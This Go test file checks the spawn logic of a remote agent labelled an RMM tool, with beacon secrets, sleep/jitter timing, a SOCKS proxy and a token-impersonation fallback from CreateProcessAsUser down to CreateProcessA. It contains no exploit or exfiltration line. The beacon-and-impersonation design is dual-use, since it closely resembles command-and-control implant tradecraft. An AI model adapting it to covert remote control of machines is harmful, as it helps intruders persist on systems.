package main

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"testing"
)

func TestSpawnDiagnosticsPreserveSingleAttemptFailure(t *testing.T) {
	for _, launchErr := range []error{
		&os.PathError{Op: "fork/exec", Path: "private-path", Err: syscall.Errno(1314)},
		errors.New("private-error-content"),
	} {
		detail := &spawnDiagnostics{}
		pid, _, _, _, err := dispatchSpawn(false, false, spawnMethods{original: func() (int, error) { return 0, launchErr }}, detail)
		if pid != 0 || !errors.Is(err, launchErr) || len(detail.Attempts) != 1 || detail.Attempts[0].Success {
			t.Fatalf("lost single-attempt failure: %#v %v", detail, err)
		}
		var code syscall.Errno
		if errors.As(launchErr, &code) && detail.Attempts[0].ErrorCode != uint32(code) {
			t.Fatal("lost wrapped Windows error code")
		}
		encoded, err := json.Marshal(detail)
		if err != nil || strings.Contains(string(encoded), "private-") {
			t.Fatal("diagnostics exposed raw error context")
		}
	}
}

// The server accepts only these beacon session identifiers.
var tokenSafeSessionID = regexp.MustCompile(`^[A-Za-z0-9_-]{8,128}$`)
var randomSessionID = regexp.MustCompile(`^[0-9a-f]{32}$`)

func TestSpawnSessionIDIsFreshAndTokenSafe(t *testing.T) {
	first := spawnSessionID("go-1730000000000000000")
	second := spawnSessionID("go-1730000000000000000")
	if first == second {
		t.Fatalf("spawn session ID must be unique per spawn: %q reused", first)
	}
	for _, id := range []string{first, second} {
		if !tokenSafeSessionID.MatchString(id) {
			t.Fatalf("spawn session ID %q is not beacon token safe", id)
		}
		if !randomSessionID.MatchString(id) {
			t.Fatalf("spawn session ID %q must be random hex without lineage", id)
		}
	}
}

func TestSpawnSessionIDIsIndependentOfParent(t *testing.T) {
	for _, parent := range []string{"", strings.Repeat("z", 200), "../path/../like", "parent-session"} {
		id := spawnSessionID(parent)
		if !randomSessionID.MatchString(id) {
			t.Fatalf("parent %q produced non-random-format session ID %q", parent, id)
		}
	}
}

func TestSpawnEnvironmentOverridesIdentityAndConnection(t *testing.T) {
	t.Setenv("RMM_SESSION_ID", "inherited-session")
	t.Setenv("RMM_TLS_VERSION", "1.3")
	t.Setenv("RMM_TLS_SESSION_RESUMPTION", "false")
	t.Setenv("RMM_LOG_FILE", "")
	cfg := &config{
		BaseURL:              "http://127.0.0.1:8787",
		BeaconSecret:         "beacon-secret",
		SessionID:            "parent-session",
		HTTPProxy:            "socks5://127.0.0.1:1080",
		PersistentHTTP:       true,
		TLSVersion:           "1.2",
		TLSSessionResumption: true,
		SleepSeconds:         45,
		JitterPercent:        20,
	}
	env := spawnEnvironment(cfg, "child-session")
	lookup := make(map[string]string)
	for _, entry := range env {
		key, value, _ := strings.Cut(entry, "=")
		lookup[key] = value
	}
	if lookup["RMM_SESSION_ID"] != "child-session" {
		t.Fatalf("spawn env must override inherited RMM_SESSION_ID, got %q", lookup["RMM_SESSION_ID"])
	}
	if lookup["RMM_BASE_URL"] != cfg.BaseURL || lookup["RMM_BEACON_SECRET"] != cfg.BeaconSecret {
		t.Fatalf("spawn env must carry explicit connection settings: %#v", lookup)
	}
	if lookup["RMM_HTTP_PROXY"] != cfg.HTTPProxy {
		t.Fatalf("spawn env lost the configured proxy, got %q", lookup["RMM_HTTP_PROXY"])
	}
	if lookup["RMM_PERSISTENT_HTTP"] != "true" {
		t.Fatal("spawn environment lost the persistent HTTP opt-in")
	}
	if lookup["RMM_TLS_VERSION"] != "1.2" {
		t.Fatal("spawn environment lost the selected TLS version")
	}
	if lookup["RMM_TLS_SESSION_RESUMPTION"] != "true" {
		t.Fatal("spawn environment lost TLS session resumption")
	}
	if lookup["RMM_SLEEP_SECONDS"] != "45" || lookup["RMM_JITTER_PERCENT"] != "20" {
		t.Fatalf("spawn env must pin current beacon timing, got %#v", lookup)
	}
	expectedLog := filepath.Join(os.TempDir(), "minimal-rmm-agent-child-session.log")
	if lookup["RMM_LOG_FILE"] != expectedLog {
		t.Fatalf("spawn env must give the child its own log file, got %q", lookup["RMM_LOG_FILE"])
	}
	for _, entry := range env {
		if strings.HasPrefix(entry, "RMM_SESSION_ID=inherited") {
			t.Fatalf("spawn env kept the inherited session identity: %q", entry)
		}
	}
}

func TestSpawnEnvironmentShortHTTPOverridesInheritedPersistence(t *testing.T) {
	t.Setenv("RMM_PERSISTENT_HTTP", "true")
	cfg := &config{PersistentHTTP: false}
	var values []string
	for _, entry := range spawnEnvironment(cfg, "child-session") {
		key, value, _ := strings.Cut(entry, "=")
		if strings.EqualFold(key, "RMM_PERSISTENT_HTTP") {
			values = append(values, value)
		}
	}
	if len(values) != 1 || values[0] != "false" {
		t.Fatalf("effective short HTTP setting must override inherited persistence once, got %q", values)
	}
}

func TestSpawnEnvironmentPreservesExplicitLogFile(t *testing.T) {
	t.Setenv("RMM_LOG_FILE", "/var/log/parent-agent.log")
	cfg := &config{BaseURL: "http://127.0.0.1:8787", BeaconSecret: "s", SessionID: "p", SleepSeconds: 60, JitterPercent: 30}
	env := spawnEnvironment(cfg, "child-session")
	for _, entry := range env {
		if strings.HasPrefix(entry, "RMM_LOG_FILE=") && entry != "RMM_LOG_FILE=/var/log/parent-agent.log" {
			t.Fatalf("explicit parent log file must be preserved, got %q", entry)
		}
	}
}

func TestSpawnCommandPreservesServerSelectedIdentityAndWorkspace(t *testing.T) {
	cfg := &config{SessionID: "go-parent-session", WorkspaceID: "old-owner", BaseURL: "https://beacon.example.test"}
	child, sessionID, err := parseSpawnCommand("__SPAWN__\n"+`{"session_id":"server-child-session","workspace_id":"selected-owner"}`, cfg)
	if err != nil || sessionID != "server-child-session" || child.WorkspaceID != "selected-owner" {
		t.Fatalf("server-selected spawn identity was not preserved: %#v %q %v", child, sessionID, err)
	}
	if cfg.WorkspaceID != "old-owner" || cfg.SessionID != "go-parent-session" {
		t.Fatal("spawn payload must not mutate the parent config")
	}
	t.Setenv("RMM_AGENT_WORKSPACE_ID", "stale-environment-owner")
	found := false
	for _, entry := range spawnEnvironment(child, sessionID) {
		if entry == "RMM_AGENT_WORKSPACE_ID=selected-owner" {
			found = true
		}
		if entry == "RMM_AGENT_WORKSPACE_ID=stale-environment-owner" {
			t.Fatal("inherited owner was not replaced")
		}
	}
	if !found {
		t.Fatal("spawn environment lost its selected workspace")
	}
}

func TestSpawnCommandRejectsInvalidOrReusedIdentityBeforeLaunching(t *testing.T) {
	cfg := &config{SessionID: "go-parent-session", WorkspaceID: "current-owner"}
	for _, command := range []string{
		"__SPAWN__\nnot-json",
		"__SPAWN__\n" + `{}`,
		"__SPAWN__\n" + `{"session_id":"go-parent-session"}`,
		"__SPAWN__\n" + `{"session_id":"../invalid"}`,
		"__SPAWN__\n" + `{"session_id":"server-child-session","workspace_id":"../invalid"}`,
	} {
		if _, _, err := parseSpawnCommand(command, cfg); err == nil {
			t.Fatalf("unsafe spawn payload was accepted: %q", command)
		}
	}
	child, sessionID, err := parseSpawnCommand("__SPAWN__", cfg)
	if err != nil || !tokenSafeSessionID.MatchString(sessionID) || sessionID == cfg.SessionID || child.WorkspaceID != cfg.WorkspaceID {
		t.Fatalf("legacy spawn must generate a fresh identity with the current owner: %#v %q %v", child, sessionID, err)
	}
}

func TestSpawnFallsBackToCreateProcessAWithoutToken(t *testing.T) {
	// No active token and no creds: only echelon 4 is tried.
	calls := 0
	detail := &spawnDiagnostics{}
	pid, method, degraded, exposure, err := dispatchSpawn(false, false, spawnMethods{
		createProcessAsUser:    func() (int, error) { t.Fatal("echelon 1 called without token"); return 0, nil },
		createProcessWithToken: func() (int, error) { t.Fatal("echelon 2 called without token"); return 0, nil },
		createProcessWithLogon: func() (int, error) { t.Fatal("echelon 3 called without creds"); return 0, nil },
		original: func() (int, error) {
			calls++
			return 42, nil
		},
	}, detail)
	if calls != 1 || pid != 42 || method != "CreateProcessA" || err != nil {
		t.Fatalf("expected single echelon-4 call: calls=%d pid=%d method=%s err=%v", calls, pid, method, err)
	}
	if degraded {
		t.Fatal("identity_degraded must be false when no token was active")
	}
	if exposure != credentialExposureAgent {
		t.Fatalf("echelon 4 must report agent exposure, got %q", exposure)
	}
	if len(detail.Attempts) != 1 || detail.Attempts[0].Method != "CreateProcessA" {
		t.Fatalf("diagnostics must record one attempt: %+v", detail.Attempts)
	}
}

func TestSpawnCascadeEchelon1Success(t *testing.T) {
	detail := &spawnDiagnostics{}
	pid, method, degraded, exposure, err := dispatchSpawn(true, true, spawnMethods{
		createProcessAsUser:    func() (int, error) { return 100, nil },
		createProcessWithToken: func() (int, error) { t.Fatal("echelon 2 tried after echelon 1 success"); return 0, nil },
		createProcessWithLogon: func() (int, error) { t.Fatal("echelon 3 tried after echelon 1 success"); return 0, nil },
		original:               func() (int, error) { t.Fatal("echelon 4 tried after echelon 1 success"); return 0, nil },
	}, detail)
	if err != nil || pid != 100 || method != "CreateProcessAsUser" || degraded || exposure != credentialExposureNone {
		t.Fatalf("echelon 1 success: pid=%d method=%s degraded=%t exposure=%s err=%v", pid, method, degraded, exposure, err)
	}
	if len(detail.Attempts) != 1 {
		t.Fatalf("expected 1 attempt, got %d", len(detail.Attempts))
	}
}

func TestSpawnCascadeEchelon1FailsFallsToEchelon2(t *testing.T) {
	detail := &spawnDiagnostics{}
	pid, method, _, exposure, err := dispatchSpawn(true, true, spawnMethods{
		createProcessAsUser:    func() (int, error) { return 0, syscall.Errno(1314) }, // ERROR_PRIVILEGE_NOT_HELD
		createProcessWithToken: func() (int, error) { return 200, nil },
		createProcessWithLogon: func() (int, error) { t.Fatal("echelon 3 tried"); return 0, nil },
		original:               func() (int, error) { t.Fatal("echelon 4 tried"); return 0, nil },
	}, detail)
	if err != nil || pid != 200 || method != "CreateProcessWithTokenW" || exposure != credentialExposureNone {
		t.Fatalf("echelon 2 fallback: pid=%d method=%s exposure=%s err=%v", pid, method, exposure, err)
	}
	if len(detail.Attempts) != 2 {
		t.Fatalf("expected 2 attempts, got %d", len(detail.Attempts))
	}
	if detail.Attempts[0].Method != "CreateProcessAsUser" || detail.Attempts[0].Success {
		t.Fatal("first attempt must be a failed CreateProcessAsUser")
	}
	if detail.Attempts[0].ErrorCode != 1314 {
		t.Fatalf("first attempt error code must be 1314, got %d", detail.Attempts[0].ErrorCode)
	}
}

func TestSpawnCascadeFullFallbackToEchelon3(t *testing.T) {
	detail := &spawnDiagnostics{}
	pid, method, _, exposure, err := dispatchSpawn(true, true, spawnMethods{
		createProcessAsUser:    func() (int, error) { return 0, syscall.Errno(1314) },
		createProcessWithToken: func() (int, error) { return 0, syscall.Errno(5) }, // ERROR_ACCESS_DENIED
		createProcessWithLogon: func() (int, error) { return 300, nil },
		original:               func() (int, error) { t.Fatal("echelon 4 tried"); return 0, nil },
	}, detail)
	if err != nil || pid != 300 || method != "CreateProcessWithLogonW" || exposure != credentialExposureLSASS {
		t.Fatalf("echelon 3 fallback: pid=%d method=%s exposure=%s err=%v", pid, method, exposure, err)
	}
	if len(detail.Attempts) != 3 {
		t.Fatalf("expected 3 attempts, got %d", len(detail.Attempts))
	}
}

func TestSpawnCascadeFullFallbackToEchelon4(t *testing.T) {
	detail := &spawnDiagnostics{}
	pid, method, degraded, exposure, err := dispatchSpawn(true, true, spawnMethods{
		createProcessAsUser:    func() (int, error) { return 0, syscall.Errno(1314) },
		createProcessWithToken: func() (int, error) { return 0, syscall.Errno(5) },
		createProcessWithLogon: func() (int, error) { return 0, syscall.Errno(1326) }, // ERROR_LOGON_FAILURE
		original:               func() (int, error) { return 400, nil },
	}, detail)
	if err != nil || pid != 400 || method != "CreateProcessA" || !degraded || exposure != credentialExposureAgent {
		t.Fatalf("echelon 4 fallback: pid=%d method=%s degraded=%t exposure=%s err=%v", pid, method, degraded, exposure, err)
	}
	if len(detail.Attempts) != 4 {
		t.Fatalf("expected 4 attempts, got %d", len(detail.Attempts))
	}
}

func TestSpawnNonElevatedSkipsEchelons1And2(t *testing.T) {
	// active=false, creds=true: echelons 1&2 skipped, 3 tried directly.
	detail := &spawnDiagnostics{}
	pid, method, _, exposure, err := dispatchSpawn(false, true, spawnMethods{
		createProcessAsUser:    func() (int, error) { t.Fatal("echelon 1 called"); return 0, nil },
		createProcessWithToken: func() (int, error) { t.Fatal("echelon 2 called"); return 0, nil },
		createProcessWithLogon: func() (int, error) { return 300, nil },
		original:               func() (int, error) { t.Fatal("echelon 4 called"); return 0, nil },
	}, detail)
	if err != nil || pid != 300 || method != "CreateProcessWithLogonW" || exposure != credentialExposureLSASS {
		t.Fatalf("non-elevated with creds: pid=%d method=%s exposure=%s err=%v", pid, method, exposure, err)
	}
}

func TestSpawnEchelon4ReportsIdentityDegradedOnlyWhenTokenActive(t *testing.T) {
	// active=true, all echelons fail → echelon 4 succeeds, identity_degraded=true.
	_, _, degraded, _, _ := dispatchSpawn(true, false, spawnMethods{
		createProcessAsUser:    func() (int, error) { return 0, syscall.Errno(1314) },
		createProcessWithToken: func() (int, error) { return 0, syscall.Errno(5) },
		original:               func() (int, error) { return 400, nil },
	})
	if !degraded {
		t.Fatal("identity_degraded must be true when token was active but echelon 4 was used")
	}
	// active=false → echelon 4 succeeds, identity_degraded=false.
	_, _, degraded, _, _ = dispatchSpawn(false, false, spawnMethods{
		original: func() (int, error) { return 400, nil },
	})
	if degraded {
		t.Fatal("identity_degraded must be false when no token was active")
	}
}

func TestSpawnAllEchelonsFailReturnsLastError(t *testing.T) {
	detail := &spawnDiagnostics{}
	finalErr := syscall.Errno(2)
	_, _, _, _, err := dispatchSpawn(true, true, spawnMethods{
		createProcessAsUser:    func() (int, error) { return 0, syscall.Errno(1314) },
		createProcessWithToken: func() (int, error) { return 0, syscall.Errno(5) },
		createProcessWithLogon: func() (int, error) { return 0, syscall.Errno(1326) },
		original:               func() (int, error) { return 0, finalErr },
	}, detail)
	if !errors.Is(err, finalErr) {
		t.Fatalf("expected final echelon error, got %v", err)
	}
	if len(detail.Attempts) != 4 {
		t.Fatalf("expected 4 attempts, got %d", len(detail.Attempts))
	}
}
